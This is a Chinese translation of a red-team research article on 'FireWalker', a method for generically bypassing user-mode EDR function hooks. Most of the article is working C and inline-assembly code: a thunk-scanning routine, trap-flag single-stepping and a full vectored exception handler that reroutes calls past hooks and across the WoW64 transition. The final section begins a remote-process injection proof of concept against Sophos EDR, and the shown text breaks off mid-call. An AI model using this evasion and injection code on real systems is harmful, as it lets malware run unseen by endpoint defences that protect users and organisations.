> 原文链接: https://www.anquanke.com//post/id/215178 


# FireWalker：一种绕过用户空间EDR Hooking的新方法


                                阅读量   
                                **196860**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者mdsec，文章来源：mdsec.co.uk
                                <br>原文地址：[https://www.mdsec.co.uk/2020/08/firewalker-a-new-approach-to-generically-bypass-user-space-edr-hooking/](https://www.mdsec.co.uk/2020/08/firewalker-a-new-approach-to-generically-bypass-user-space-edr-hooking/)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p2.ssl.qhimg.com/t01a4d0840430bb8631.png)](https://p2.ssl.qhimg.com/t01a4d0840430bb8631.png)



## 0x00 概述

在红队攻击过程中，经常会遇到终端防御与响应（EDR）或终端防御与阻止（EDP）产品，这些产品实现了用户层的挂钩，以判断进程的行为特征并监控潜在的恶意代码。此前，攻击者不断尝试如何绕过EDR/EDP产品，其中包括一位在Outflank的朋友，他们使用直接系统调用的方式来尝试绕过。在本文中，我们将详细描述一种新的通用方法，可以绕过用户层的EDR挂钩。

我们所使用的技术包括跟踪可能调用挂钩函数的代码、检测挂钩、将执行重定向到原始代码（通常转移到其他位置的小线程），通过使用这些方法，可以逃避以其他方式实现的防御层。

实际过程中，还需要解决一些比较小的缺点，以便让这种方法发挥最大的效果，希望这篇文章能提供一个不错的起点，为大家进一步的研究奠定基础。



## 0x01 函数挂钩

函数挂钩（Hooking）是一种用于在执行时拦截函数调用的技术，从而在应用程序运行时检查、修改或替换挂钩的函数的行为。函数挂钩通常用于开发人员无法拿到源代码的情况下，否则可能会优先考虑其他技术。

有几种方法可以用于挂钩函数。其中一种是重定向导入地址表（IAT）中的条目，将其指向关联的函数挂钩，然后这个挂钩随后根据需要调用原始函数。这种方法涉及到在运行时遍历应用程序的导入目录，并按照名称（或按照顺序）枚举导入的函数，直到识别出所需的函数为止，然后使用指向该挂钩的指针覆盖关联的IAT条目。

但是，这种方法并不是红队开发人员首先的方法，因为有可能并不是对挂钩函数的每个调用都会被拦截。举例来说，如果应用程序在进行挂钩之前已经缓存了指向原始函数的指针，一旦调用了原始函数，那么挂钩就会被绕过。同样，如果采用其他定位目标函数的方法，也存在这样的可能性。例如，通过使用Windows API GetProcAddress，会返回指向原始函数的指针，而不是挂钩。挂钩按名称导入的函数，也仅适用于由某些其他DLL导出的函数，而不是内部函数这类。

考虑到上述缺点，函数挂钩的最佳方案可能是直接重写目标函数。通过这种方法，将目标的前几条指令从函数中复制到可执行存储器中，并将jmp替换为挂钩。直接在复制的指令后面添加一条jmp指令，以在复制的指令之后的位置返回到原始函数。这样，就可以无缝地将函数调用（包含完整的参数和寄存器）重定向到挂钩函数。然后，挂钩函数可以根据需要，任意地检查和修改参数，然后可以选择通过调用新分配的可执行内存地址（其中包含原始指令和新增的jmp）来调用原始函数。

这种方法是可行的，因为它会覆盖被挂钩的函数本身，而不是覆盖指向该函数的指针。这种方法理论上可以成功地拦截对挂钩函数的每个调用，而不仅仅是拦截依赖于IAT的特定模块。因此，使用这种函数挂钩技术的意义更大。对于反恶意软件产品和EDR产品来说，其检测效果取决于检测和检查特定函数使用情况的能力。

要实现函数挂钩库，就需要格外小心，要保证对目标函数的修改不会导致应用程序崩溃。在库执行出现问题时，可能会导致竞争条件（重写函数序言和另一个试图执行序言的线程之间的竞争）、破坏指令（一旦对挂钩函数序言格式做出了错误假设，可能会导致被复制和覆盖的指令数量不正确）、调用约定不匹配（假设特定函数使用的调用约定可能导致挂钩目标错误地实现了参数管理和栈清理，从而引发崩溃）等问题。

如果要生成安全可靠的函数挂钩库，这个过程非常复杂，因此厂商很少会开发自己的挂钩功能。相反，他们通常会使用一些流行的库。这些工具包括Frida和Microsoft Detours，这两种工具都可以免费用于商业和非商业用途。



## 0x02 函数挂钩示例

反恶意软件和EDR产品通常在受保护的进程中利用某种形式的函数挂钩来确定是否可以将当前代码执行活动判断为恶意。例如，对于许多桌面应用程序而言，调用函数创建进程、打开某些现有进程、创建进程的小型转储、读取/写入属于其他进程的内存，这些都属于相对不太常见的行为。如果设置了针对这些活动进行拦截的功能，EDR就可以提供有价值的信息，提醒正常的应用程序行为可能受到影响或被篡改，安全产品可以记录相关行为或告警，并在需要时终止受影响的过程。

为了实现对诸如创建进程的监控，EDR可以选择挂钩到从`CreateProcess`到`NtCreateUserProcess`的调用链中的任意位置，找到它们对应的函数。考虑到以下代码在WoW64的32位进程中运行，在调试器中使用断点，发现断点位于`NtCreateUserProcess`上：

```
if (!CreateProcess(L"c:\\windows\\notepad.exe", NULL, NULL, NULL, FALSE, 0, NULL, NULL, &amp;si, &amp;pi))
    `{`
        printf("Failed to create process\n");
    `}`
    else
    `{`
        printf("Created process\n");
    `}`
```

下面的栈跟踪说明了潜在的挂钩点。对于此调用，挂钩点是`CreateProcessW`、`CreateProcessInternalW`和`NtCreateUserProcess`。反汇编`NtCreateUserProcess`后的代码表示，该函数是交给WoW64系统调用处理程序之前需要调用的最后一个函数。

```
0:000&gt; u ntdll!NtCreateUserProcess
ntdll!NtCreateUserProcess:
77ac2a60 b8c4000000      mov     eax,0C4h
77ac2a65 ba008ead77      mov     edx,offset ntdll!Wow64SystemServiceCall (77ad8e00)
77ac2a6a ffd2            call    edx
77ac2a6c c22c00          ret     2Ch
77ac2a6f 90              nop
0:000&gt; bp ntdll!NtCreateUserProcess
0:000&gt; g
Breakpoint 0 hit
eax=007cf120 ebx=00000000 ecx=007ceee0 edx=00000000 esi=00000000 edi=00c6b1b8
eip=77ac2a60 esp=007cec60 ebp=007cf6d8 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
ntdll!NtCreateUserProcess:
77ac2a60 b8c4000000      mov     eax,0C4h
0:000&gt; k
 # ChildEBP RetAddr  
00 007cec5c 761fa0cb ntdll!NtCreateUserProcess
01 007cf6d8 761f867c KERNELBASE!CreateProcessInternalW+0x19db
02 007cf710 0082110b KERNELBASE!CreateProcessW+0x2c
03 007cf7c0 00821fbd FireWalker!main+0x7b [C:\Users\Peter\source\repos\FireWalker\FireWalker\FireWalker.cpp @ 271]
```

由于EDR产品会拦截对`CreateProcess`的调用，因此将钩子挂在尽可能最低的级别上是有帮助的。在案例中，钩子会挂在进行系统调用的函数（NtCreateUserProcess）。实际上，可以将钩子安装到比32位进程的更高级别上，在相应的64位模块中，一旦处理器从Guest（WoW）模式转换为Host模式（64位），该模块就会执行。<br>
为了描述所设计的更高级别概念，我们在下面的分析过程中将省略这一细节。

如果要使用Microsoft Detours挂钩NtCreateUserProcess，可以使用以下代码：

```
FUNC_NTCREATEUSERPROCESS Real_NtCreateUserProcess = NULL;

NTSTATUS (NTAPI Hooked_NtCreateUserProcess)(
    PHANDLE ProcessHandle,
    PHANDLE ThreadHandle,
    ACCESS_MASK ProcessDesiredAccess,
    ACCESS_MASK ThreadDesiredAccess,
    POBJECT_ATTRIBUTES ProcessObjectAttributes,
    POBJECT_ATTRIBUTES ThreadObjectAttributes,
    ULONG ProcessFlags,
    ULONG ThreadFlags,
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
    PPROCESS_CREATE_INFO CreateInfo,
    PPROCESS_ATTRIBUTE_LIST AttributeList
    )
`{`
    std::wstring log = L"Intercepted call to NtCreateUserProcess\n";

    if (ProcessParameters != NULL)
    `{`
        log += L"  ImagePathName: " + (ProcessParameters-&gt;ImagePathName.Buffer ?
            std::wstring(ProcessParameters-&gt;ImagePathName.Buffer, ProcessParameters-&gt;ImagePathName.Length / 2) :
            std::wstring(L"(unspecified)")) + L"\n";

        log += L"  CommandLine: " + (ProcessParameters-&gt;CommandLine.Buffer ?
            std::wstring(ProcessParameters-&gt;CommandLine.Buffer, ProcessParameters-&gt;CommandLine.Length / 2) :
            std::wstring(L"(unspecified)")) + L"\n";
    `}`
    else
    `{`
        log += L"  ProcessParameters unspecified\n";
    `}`

    wprintf(L"%s", log.c_str());

    return Real_NtCreateUserProcess(
        ProcessHandle,
        ThreadHandle,
        ProcessDesiredAccess,
        ThreadDesiredAccess,
        ProcessObjectAttributes,
        ThreadObjectAttributes,
        ProcessFlags,
        ThreadFlags,
        ProcessParameters,
        CreateInfo,
        AttributeList
    );
`}`

int main()
`{`
    Real_NtCreateUserProcess = (FUNC_NTCREATEUSERPROCESS)GetProcAddress(GetModuleHandle(L"ntdll"), "NtCreateUserProcess");

    DetourTransactionBegin();
    DetourAttach((PVOID*)&amp;Real_NtCreateUserProcess, Hooked_NtCreateUserProcess);
    DetourTransactionCommit();
...
```

在进行挂钩后，执行前面所说的`CreateProcess(L"c:\\windows\\notepad.exe", ...)`，将会导致挂钩Hooked_NtCreateUserProcess的执行，打印出执行进程的路径名称和命令行。

[![](https://p3.ssl.qhimg.com/t01ef9f4ba93fbe8c9a.png)](https://p3.ssl.qhimg.com/t01ef9f4ba93fbe8c9a.png)

我们想探究其详细执行过程，可以在调用`CreateProcess`和函数`NtCreateUserProcess`反汇编之前放置一个断点。可以体现出挂钩的存在：

```
0:000&gt; u ntdll!NtCreateUserProcess
ntdll!NtCreateUserProcess:
77ac2a60 e9abe75389      jmp     FireWalker!Hooked_NtCreateUserProcess (01001210)
77ac2a65 ba008ead77      mov     edx,offset ntdll!Wow64SystemServiceCall (77ad8e00)
77ac2a6a ffd2            call    edx
77ac2a6c c22c00          ret     2Ch
77ac2a6f 90              nop
```

将上面的代码与`NtCreateUserProcess`的原始列表进行比较，可以看出新增的jmp指令，该指令将重定向到新创建的Hooked_NtCreateUserProcess函数，而这个函数负责记录进程创建事件。要检查Detours库是如何实现thunk，从而使挂钩函数的最后可以调用原始`NtCreateUserProcess`，我们可以找到`Real_NtCreateUserProcess`并对其进行反汇编。

使用WinDBG，我们找到了`Real_NtCreateUserProcess`全局变量，然后使用`!address`扩展检查其指向的内存：

```
0:000&gt; x FireWalker!Real_NtCreateUserProcess
010223f8          FireWalker!Real_NtCreateUserProcess = 0x6fab00d8
0:000&gt; !address 0x6fab00d8


Mapping file section regions...
Mapping module regions...
Mapping PEB regions...
Mapping TEB and stack regions...
Mapping heap regions...
Mapping page heap regions...
Mapping other regions...
Mapping stack trace database regions...
Mapping activation context regions...

Usage:                  &lt;unknown&gt;
Base Address:           6fab0000
End Address:            6fac0000
Region Size:            00010000 (  64.000 kB)
State:                  00001000          MEM_COMMIT
Protect:                00000020          PAGE_EXECUTE_READ
Type:                   00020000          MEM_PRIVATE
Allocation Base:        6fab0000
Allocation Protect:     00000040          PAGE_EXECUTE_READWRITE


Content source: 1 (target), length: ff28
0:000&gt; u 0x6fab00d8
6fab00d8 b8c4000000      mov     eax,0C4h
6fab00dd e983290108      jmp     ntdll!NtCreateUserProcess+0x5 (77ac2a65)
```

从`!address`命令的输出我们可以看到，底层内存被标记为可执行（`PAGE_EXECUTE_READ`），这是预期的情况。对thunk的地址处进行反汇编可以表明，原始函数`NtCreateUserProcess`的前几条指令（在示例中，仅有mov这单条指令）已经存储，然后是一个返回到`NtCreateUserProcess`函数的jmp命令。在行为的角度上看，它等效于原始函数。

为了逃避EDR软件拦截挂钩函数调用的能力，我们通常会采取几种方法。第一种是直接对内核（或者在这里，是对WoW64系统调用处理程序）进行系统调用，这可能是最有效的方法，因为它绕过了所有用户模式挂钩。要实现这种技术，进程将实现与原始`NtCreateUserProcess`函数相同的功能（后面介绍），然后会执行这个函数以创建进程：

```
ntdll!NtCreateUserProcess:
77ac2a60 b8c4000000      mov     eax,0C4h
77ac2a65 ba008ead77      mov     edx,offset ntdll!Wow64SystemServiceCall (77ad8e00)
77ac2a6a ffd2            call    edx
77ac2a6c c22c00          ret     2Ch
```

在64位进程（或本地32位进程）中，通过使用`syscall`指令（或者在某些情况下是`0x2e`中断）直接对内核进行调用，例如：

```
ntdll!NtCreateUserProcess:
00007ffc`a2edd8d0 4c8bd1          mov     r10,rcx
00007ffc`a2edd8d3 b8c4000000      mov     eax,0C4h
00007ffc`a2edd8d8 f604250803fe7f01 test    byte ptr [SharedUserData+0x308 (00000000`7ffe0308)],1
00007ffc`a2edd8e0 7503            jne     ntdll!NtCreateUserProcess+0x15 (00007ffc`a2edd8e5)
00007ffc`a2edd8e2 0f05            syscall
00007ffc`a2edd8e4 c3              ret
00007ffc`a2edd8e5 cd2e            int     2Eh
00007ffc`a2edd8e7 c3              ret
```

这个技术的缺点在于，用于表示要由syscall指令执行的例程的syscall数字（上例中为0xc4）在Windows操作系统不同版本和不同Service Pack之间都存在一些变化，这意味着在进行系统调用之前，必须首先确定底层操作系统和版本，并且在安装新的Service Pack后更新代码。在实际中，只需要记录`NtOpenFile`和`NtReadFile`的系统调用，因为它们可以用于打开磁盘上的`ntdll.dll`副本，可以从中提取其他有效的syscall。

第二种技术通过从加载到内存DLL的第二个副本中还原原始代码来还原受影响的函数。与第一种技术相似，需要将原始`ntdll.dll`二进制文件读取到内存中，之后在原始DLL中找到被挂钩的函数（例如`NtCreateUserProcess`），并通过挂钩函数从原始函数代码中复制前几个字节，以恢复原始的行为。这样，就可以对拦截的函数取消挂钩。

第三种技术是使用`LoadLibrary`加载已经挂钩到内存中的DLL的第二个副本，然后调用由DLL副本（而不是原始副本）实现的所需API。还是以刚才为例，`ntdll.dll`文件的副本将存储在磁盘上的某个位置（例如Windows临时文件夹中），然后将该副本作为库加载。随后，将使用`GetProcAddress`在DLL副本中定位感兴趣的函数：

```
CopyFile(L"c:\\windows\\syswow64\\ntdll.dll", L"c:\\windows\\temp\\ntdllcopy.dll", TRUE);

HMODULE hmNtdllCopy = LoadLibrary(L"c:\\windows\\temp\\ntdllcopy.dll");
if (!hmNtdllCopy)
`{`
    printf("LoadLibrary failed");
    return 1;
`}`

FUNC_NTCREATEUSERPROCESS pNtCreateUserProcess = (FUNC_NTCREATEUSERPROCESS)GetProcAddress(hmNtdllCopy, "NtCreateUserProcess");

...
status = pNtCreateUserProcess(&amp;hProcess, &amp;hThread, MAXIMUM_ALLOWED, MAXIMUM_ALLOWED, NULL, NULL, 0x200, 1, &amp;userParams, &amp;procInfo, &amp;attrList);
```

上述提到的这三种方式，都有着各自的优点和缺点，并且可能会导致出现不同的异常提示。比如，我们如果使用第二种方法，在`ntdll.dll`中恢复挂钩函数的原始代码，可能会触发EDR的告警，因为EDR会定期检查挂钩是否完好。如果使用第三种方法，可能会被`ntdll`函数`LdrLoadDll`上的挂钩检测到，这个挂钩是用于判断是否正在尝试从另一个磁盘位置重新加载现有模块。



## 0x03 FireWalker概念

在进一步考虑如何逃避检测的过程中，我想到了一个思路。由于函数挂钩库通常只会重定位和重写函数，因此所有关于挂钩函数的原始指令仍然必须以某种形式驻留在内存中。如果是这样，是否有可能跟踪和管理代码的执行，以允许按照通常的方式对`CreateProcess`的调用，但在代码执行过程的每一步，从CreateProcess的初始调用到最终的系统调用（或WoW64），都可以检测到挂钩并避开？

例如，在调用`NtCreateUserProcess`函数时，与其通过直接跳转到挂钩函数来继续执行挂钩的代码，不如在检测到`jmp Hooked_NtCreateUserProcess`的跳转尝试后定位并重定向到`Real_NtCreateUserProcess` thunk？<br>
如果可以实施这样的策略，那么可能会进一步产生优势，也就是我们不需要知道已经挂钩了哪个函数（在`CreateProcess`到`NtCreateUserProcess`之间），就可以成功避免拦截。

为了实现这一点，我想了几个思路，其中最简单的思路就是设置处理器陷阱标志（Trap Flag），这样处理器会被置为单步模式，在执行每个步骤后引发单步异常指令。然后，可以安装一个异常处理程序，在每条指令之后执行，用于检查要执行的下一条指令，判断其是否在对挂钩函数进行调用。如果判断在进行这样的调用，可以将指令指针更新为包含执行目标原始代码的thunk，然后继续执行操作，这样就绕过了挂钩。

在尝试实现这种思路的过程中，我们面临的主要困难就是查找包含原始函数代码的thunk。它可能被存储在内存中的任何位置，而指针仅由实现该挂钩的代码来维护，因此通常只能通过在进程内存中大范围搜索潜在目标来定位thunk，似乎没有一个更智能的思路从周围的代码中提取出thunk地址。

有一个可以用于识别这些thunk的方法，是在可执行内存中搜索跳转回原始函数的jmp指令（即`NtCreateUserProcess`实例中的`jmp ntdll!NtCreateUserProcess+0x5`）。可以通过使用`VirtualQuery`（或较低级别的API `NtQueryVirtualMemory`）枚举内存页面来执行搜索，或者在32位环境中可以通过强行强制内存范围来执行此搜索。然后，可以将结果进行缓存，以备后续调用。

这里有一个示例的实现，用于识别跳回特定函数的thunk（例如挂钩函数的原始函数）：

```
DWORD FindThunkJump(DWORD RangeStart, DWORD RangeEnd)
`{`
    DWORD Address = 1;
    MEMORY_BASIC_INFORMATION mbi;

    while (Address &lt; 0x7fffff00)
    `{`
        SIZE_T result = VirtualQuery((PVOID)Address, &amp;mbi, sizeof(mbi));
        if (!result)
        `{`
            break;
        `}`

        Address = (DWORD)mbi.BaseAddress;

        if (mbi.Protect &amp; (PAGE_EXECUTE_READ | PAGE_EXECUTE_READWRITE))
        `{`
            for (DWORD i = 0; i &lt; (mbi.RegionSize - 6); i++)
            `{`
                __try
                `{`
                    if (*(PBYTE)Address == 0xe9)
                    `{`
                        // jmp rel
                        DWORD Target = Address + *(DWORD*)(Address + 1) + 5;

                        if (Target &gt;= RangeStart &amp;&amp; Target &lt;= RangeEnd)
                        `{`
                            return Address;
                        `}`
                    `}`
                    else if (*(PBYTE)Address == 0xff &amp;&amp; *(PBYTE)(Address + 1) == 0x25)
                    `{`
                        // jmp indirect
                        DWORD Target = *(DWORD*)(Address + *(DWORD*)(Address + 2) + 6);

                        if (Target &gt;= RangeStart &amp;&amp; Target &lt;= RangeEnd)
                        `{`
                            return Address;
                        `}`
                    `}`
                `}`
                __except (EXCEPTION_EXECUTE_HANDLER)
                `{`

                `}`

                Address++;
            `}`
        `}`

        Address = (DWORD)mbi.BaseAddress + mbi.RegionSize;
    `}`

    return 0;
`}`
```

上面的实现是专门为32位进程（本地和WoW64）设计的，但是除了使用较大的指针（例如DWORD64整型）之外，相同的实现也可以用于本地64位进程。`RangeStart`和`RangeEnd`参数指定了从挂钩函数的开始到函数中某个点的内存区域，合理的预测离开该thunk的jmp指向该点。这段代码会遍历内存区域，确定这个区域是否已经映射；如果已经映射，则确认该区域是否可执行；如果确定某个地址包含指向预期内存范围内的jmp指令，则返回到调用方。

在这一点上，值得一提的是，如果仅使用较低级别的API（即NT*函数），则只需要识别挂钩的API函数的thunk，并直接调用thunk来替代原始函数就足够了，不需要跟踪要实现的进程。

这样，可以保证最佳的性能，并能够逃避由EDR执行的任何检查，同时确保挂钩都完好无损。这种方法的唯一缺点是，它还是需要调用者知道调用栈中的哪些函数（哪个API）已经被挂钩。

为了实现单步进程，可以使用以下代码启用/禁用陷阱标志，以启动跟踪：

```
__forceinline void Trap()
`{`
    __asm
    `{`
        pushfd
        or dword ptr[esp], 0x100
        popfd
    `}`
`}`

DECLSPEC_NOINLINE void Untrap()
`{`
    __asm `{` int 3 `}`
    return;
`}`
```

陷阱函数通过将标志压入栈中，并使用OR指令设置相关位来设置处理器EFLAGS寄存器中的TF位（第8位）。

`Untrap`函数声明为`DECLSPEC_NOINLINE`，其中包含一个虚拟主体（一个int 3断点），以确保编译器不会对其进行优化。随后，会检测到该函数的执行，并且作为响应，不会将TF位置1，这就导致不再进行跟踪。

为了拦截由于调用陷阱函数而导致的单步中断异常，并确定执行的指令是否需要重定向，我们可以使用向量异常处理程序（VEH）。也可以选择使用基于帧的结构化异常处理程序（SEH），但是实际表明，这种方法的可靠性较差，因为SEH处理程序可能会被我们跟踪的函数覆盖，而该函数可能会选择处理自身的单步异常，从而导致执行流中断或跟踪丢失。

所以，VEH方式要比SEH更好一些。通过使用VEH，我们将优先考虑是否应该处理例外情况。我们可以按照下面的方式使用VEH：

```
HANDLE veh = AddVectoredExceptionHandler(1, TrapFilter);
    Trap();

    bResult = CreateProcess(L"c:\\windows\\notepad.exe", NULL, NULL, NULL, FALSE, 0, NULL, NULL, &amp;si, &amp;pi);

    Untrap();
    RemoveVectoredExceptionHandler(veh);
```

跟踪逻辑的核心是在`TrapFilter`函数中实现的，其函数如下：

```
LONG __stdcall TrapFilter(PEXCEPTION_POINTERS pexinf)
`{`
    IF_DEBUG(printf("[0x%p] pexinf-&gt;ExceptionRecord-&gt;ExceptionAddress = 0x%p, pexinf-&gt;ExceptionRecord-&gt;ExceptionCode = 0x%x (%u)\n",
        pexinf-&gt;ContextRecord-&gt;Eip,
        pexinf-&gt;ExceptionRecord-&gt;ExceptionAddress,
        pexinf-&gt;ExceptionRecord-&gt;ExceptionCode,
        pexinf-&gt;ExceptionRecord-&gt;ExceptionCode));

    if (pexinf-&gt;ExceptionRecord-&gt;ExceptionCode == EXCEPTION_ACCESS_VIOLATION &amp;&amp;
        ((DWORD)pexinf-&gt;ExceptionRecord-&gt;ExceptionAddress &amp; 0x80000000) != 0)
    `{`
        pexinf-&gt;ContextRecord-&gt;Eip = pexinf-&gt;ContextRecord-&gt;Eip ^ 0x80000000;
        IF_DEBUG(printf("Setting EIP back to 0x%p\n", pexinf-&gt;ContextRecord-&gt;Eip));
    `}`
    else if (pexinf-&gt;ExceptionRecord-&gt;ExceptionCode != EXCEPTION_SINGLE_STEP)
    `{`
        return EXCEPTION_CONTINUE_SEARCH;
    `}`

    UINT length = length_disasm((PBYTE)pexinf-&gt;ContextRecord-&gt;Eip);
    IF_DEBUG(printf("[0x%p] %S", pexinf-&gt;ContextRecord-&gt;Eip, HexDump((PBYTE)pexinf-&gt;ContextRecord-&gt;Eip, length).c_str()));

    // https://c9x.me/x86/html/file_module_x86_id_26.html

    DWORD CallTarget = 0;
    DWORD CallInstrLength = 2;

    switch (*(PBYTE)pexinf-&gt;ContextRecord-&gt;Eip)
    `{`
    case 0xff:
        // FF /2    CALL r/m32    Call near, absolute indirect, address given in r/m32

        switch (*(PBYTE)(pexinf-&gt;ContextRecord-&gt;Eip + 1))
        `{`
        case 0x10:
            CallTarget = *(DWORD*)pexinf-&gt;ContextRecord-&gt;Eax;
            break;
        case 0x11:
            CallTarget = *(DWORD*)pexinf-&gt;ContextRecord-&gt;Ecx;
            break;
        case 0x12:
            CallTarget = *(DWORD*)pexinf-&gt;ContextRecord-&gt;Edx;
            break;
        case 0x13:
            CallTarget = *(DWORD*)pexinf-&gt;ContextRecord-&gt;Ebx;
            break;
        case 0x15:
            CallTarget = *(DWORD*)(*(DWORD*)(pexinf-&gt;ContextRecord-&gt;Eip + 2));
            CallInstrLength = 6;
            break;
        case 0x16:
            CallTarget = *(DWORD*)pexinf-&gt;ContextRecord-&gt;Esi;
            break;
        case 0x17:
            CallTarget = *(DWORD*)pexinf-&gt;ContextRecord-&gt;Edi;
            break;
        case 0xd0:
            CallTarget = pexinf-&gt;ContextRecord-&gt;Eax;
            break;
        case 0xd1:
            CallTarget = pexinf-&gt;ContextRecord-&gt;Ecx;
            break;
        case 0xd2:
            CallTarget = pexinf-&gt;ContextRecord-&gt;Edx;
            break;
        case 0xd3:
            CallTarget = pexinf-&gt;ContextRecord-&gt;Ebx;
            break;
        case 0xd6:
            CallTarget = pexinf-&gt;ContextRecord-&gt;Esi;
            break;
        case 0xd7:
            CallTarget = pexinf-&gt;ContextRecord-&gt;Edi;
            break;
        `}`

        break;
    case 0xe8:
        // E8 cd    CALL rel32    Call near, relative, displacement relative to next instruction

        CallTarget = pexinf-&gt;ContextRecord-&gt;Eip + *(DWORD*)(pexinf-&gt;ContextRecord-&gt;Eip + 1) + 5;
        CallInstrLength = 5;

        break;
    `}`

    if (CallTarget != 0)
    `{`
        IF_DEBUG(printf("Call to 0x%p\n", CallTarget));

        if (*(PBYTE)CallTarget == 0xe9)
        `{`
            IF_DEBUG(printf("Call to 0x%p leads to jmp\n", CallTarget));

            DWORD ThunkAddress = FindThunkJump((DWORD)CallTarget, CallTarget + 16);
            DWORD ThunkLength = ThunkAddress + *(DWORD*)(ThunkAddress + 1) + 5 - CallTarget;

            if (CallTarget != ThunkAddress)
            `{`
                IF_DEBUG(printf("Thunk address 0x%p length 0x%x\n", ThunkAddress, ThunkLength));
                IF_DEBUG(printf("Thunk [0x%p] %S", ThunkAddress, HexDump((PVOID)(ThunkAddress - ThunkLength), ThunkLength + 5).c_str()));

                // emulate the call
                pexinf-&gt;ContextRecord-&gt;Esp -= 4;
                *(DWORD*)pexinf-&gt;ContextRecord-&gt;Esp = pexinf-&gt;ContextRecord-&gt;Eip + CallInstrLength;

                pexinf-&gt;ContextRecord-&gt;Eip = ThunkAddress - ThunkLength;
            `}`
        `}`
    `}`

    if (*(PBYTE)pexinf-&gt;ContextRecord-&gt;Eip != 0xea || *(PWORD)(pexinf-&gt;ContextRecord-&gt;Eip + 5) != 0x33)
    `{`
        if (pexinf-&gt;ContextRecord-&gt;Eip == (DWORD)Untrap)
        `{`
            IF_DEBUG(printf("Removing trap\n"));
            pexinf-&gt;ContextRecord-&gt;Eip += 1; // skip int3
        `}`
        else
        `{`
            IF_DEBUG(printf("Restoring trap\n"));
            pexinf-&gt;ContextRecord-&gt;EFlags |= 0x100; // restore trap
        `}`
    `}`
    else
    `{`
        // heaven's gate - trap the return
        IF_DEBUG(printf("Entering heaven's gate\n"));
        *(DWORD*)pexinf-&gt;ContextRecord-&gt;Esp |= 0x80000000; // set the high bit
    `}`

    return EXCEPTION_CONTINUE_EXECUTION;
`}`
```

代码首先确定正在处理的异常是由于尝试执行设置了高位的地址（即0x80000000以上，稍后进行详细说明）导致的访问冲突，还是单步异常。如果两者都不是，那么将通知异常分发程序（exception dispatcher）继续搜索处理程序。然后，按照VEH和SEH链条传递异常，直到该异常被处理或进程终止。

接下来，检查`CONTEXT`记录，确定要由处理器执行的下一条指令的第一个字节。检查该指令以确定它是否代表`call [indirect reg]`、`call [indirect mem]`或`call relative`，如果是，则计算调用目标。

如果可以从上述步骤中确定调用目标，则将检查调用目标处的指令，以确认它是否是相对jmp（0xe9），因为直接调用jmp可能意味着挂钩函数。如果是相对jmp，则使用`FindThunkJump`函数来尝试查找以ajmp结尾的可执行文件thunk，将其返回到挂钩函数中。然后进行检查，以确保jmp目标不等于调用目标，从而避免导致无限循环（ntdll中的一个函数就存在这样的行为）。

最后，将对挂钩jmp的调用替换为对thunk本身的调用，方法是将正确的返回地址推入栈（`*(DWORD*)pexinf-&gt;ContextRecord-&gt;Esp = pexinf-&gt;ContextRecord-&gt;Eip + CallInstrLength;`），并更新指令指针，以指向thunk的开始部分。然后，`TrapFilter`函数返回到异常分发程序，其结果为`EXCEPTION_CONTINUE_EXECUTION`，该结果将使用更新的`CONTEXT`继续执行，最终有效地跳过了挂钩。然后，在`CONTEXT`结构中重新启用陷阱标志（`pexinf-&gt;ContextRecord-&gt;EFlags |= 0x100;`），以启用对下一条指令的跟踪。

如前所述，在处理WoW64时确实会出现复杂情况。WoW64上的系统调用不是通过直接执行syscall指令来处理，而是通过执行`Wow64SystemServiceCallfunction`，该函数通过使用特殊的段选择符0x33将处理器从Guest模式（32位模拟）转换为Host模式（本地64位）。例如，在我们的案例中，`TrapFilter`函数中最终if语句检测到的是`jmp 0033:77A46009`。使用上面的技术无法跟踪这样的转换，所以执行跟踪会在这里停止。处理器模式之间的这种转换，有时被称为“天堂之门”。

为了解决这个问题，我们发现当执行`Wow64SystemServiceCall`函数将处理器从32位模拟模式转换为64位本地模式时，当处理器切换为32位模式时，恢复执行的返回地址位于栈的顶部。

在允许执行“天堂之门”指令之前，高位设置在栈顶部的返回地址上（`*(DWORD*)pexinf-&gt;ContextRecord-&gt;Esp |= 0x80000000`），这会导致在恢复执行32位代码后立即尝试执行无效地址，而发生访问冲突。处理这个条件的是`TrapFilter`函数的第一个if语句，该函数会检测到最终的访问冲突，并在还原陷阱标志并让程序继续执行之前，从指令指针中删除高位。

我们执行前面详细介绍过的`CreateProcess`示例，就可以证明这个方法的有效性。首先删除对`Trap()`的调用，这时出现与之前相同的结果：

[![](https://p3.ssl.qhimg.com/t013db7aff5e841c5fc.png)](https://p3.ssl.qhimg.com/t013db7aff5e841c5fc.png)

然后，恢复`Trap()`函数的调用，执行相同的代码，启动跟踪，在没有记录参数的情况下展示了成功逃避挂钩：

[![](https://p3.ssl.qhimg.com/t0191cbbc714a21ac5d.png)](https://p3.ssl.qhimg.com/t0191cbbc714a21ac5d.png)



## 0x04 实战：FireWalker VS Sophos EDR

为了将FireWalker概念投入到实际攻防对抗中，我们使用PoC测试了许多EDR产品，这里的PoC用到了代码注入和执行技术，而这些技术通常被后漏洞利用工具（例如UrbanBishop）使用，也经常会被检测到。

```
printf("About to open process\n");
    getchar();

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);
    if (!hProcess)
    `{`
        printf("Error opening process\n");
        return 1;
    `}`

    printf("About to alloc memory\n");
    getchar();

    LPVOID lpvRemote = VirtualAllocEx(hProcess, NULL, 8192, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!lpvRemote)
    `{`
        printf("Unable to allocate remote memory\n");
        return 1;
    `}`

    printf("About to write memory\n");
    getchar();

    SIZE_T BytesWritten = 0;

    if (!WriteProcessMemory(hProcess, lpvRemote, rgbPayload, lFileSize, &amp;BytesWritten))
    `{`
        printf("Unable to write memory\n");
        return 1;
    `}`

    printf("About to create thread\n");
    getchar();

    HANDLE hRemoteThread = CreateRemoteThreadEx(
        hProcess,
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(L"ntdll"), "RtlExitUserThread"),
        0,
        CREATE_SUSPENDED,
        NULL,
